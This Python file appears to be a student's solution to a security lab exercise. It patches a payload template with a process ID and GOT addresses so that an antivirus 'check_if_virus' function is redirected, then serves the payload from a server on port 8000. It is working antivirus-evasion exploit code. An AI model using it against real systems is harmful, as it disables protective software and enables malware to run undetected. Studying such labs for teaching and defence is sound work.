import server
import struct
from addresses import CHECK_IF_VIRUS_GOT, CHECK_IF_VIRUS_ALTERNATIVE, address_to_bytes


class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):
        old_got = address_to_bytes(CHECK_IF_VIRUS_GOT)
        new_addr = address_to_bytes(CHECK_IF_VIRUS_ALTERNATIVE)
        pid_addr = address_to_bytes(pid)
       
        file = open("q3.template","r")
        data = list(file.read())
        for index in range(len(data)):
            if(data[index]   =='\x78'and\
                data[index+1]=='\x56'and\
                data[index+2]=='\x34'and\
                data[index+3]=='\x12'):

                #print("Pid changed")
                #print (data[index:index+4])
                data[index]   = pid_addr[0]
                data[index+1] = pid_addr[1]
                data[index+2] = pid_addr[2]
                data[index+3] = pid_addr[3]
                #print (data[index:index+4])

            if(data[index]   =='\xff' and\
                data[index+1]=='\xef'and\
                data[index+2]=='\xcd'and\
                data[index+3]=='\xab'):

                #print("func changed")
                #print (data[index:index+4])

                data[index]   = old_got[0]#'\xe0'
                data[index+1] = old_got[1]#'\x37'#
                data[index+2] = old_got[2]#'\xfd'#
                data[index+3] = old_got[3]#'\xb7'#
                #print (data[index:index+4])

            if(data[index]   =='\xcd' and\
                data[index+1]=='\xab'and\
                data[index+2]=='\xcd'and\
                data[index+3]=='\xab'):


                data[index]   = new_addr[0]#'\xe0'
                data[index+1] = new_addr[1]#'\x37'#
                data[index+2] = new_addr[2]#'\xfd'#
                data[index+3] = new_addr[3]#'\xb7'#
        return "".join(data)

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

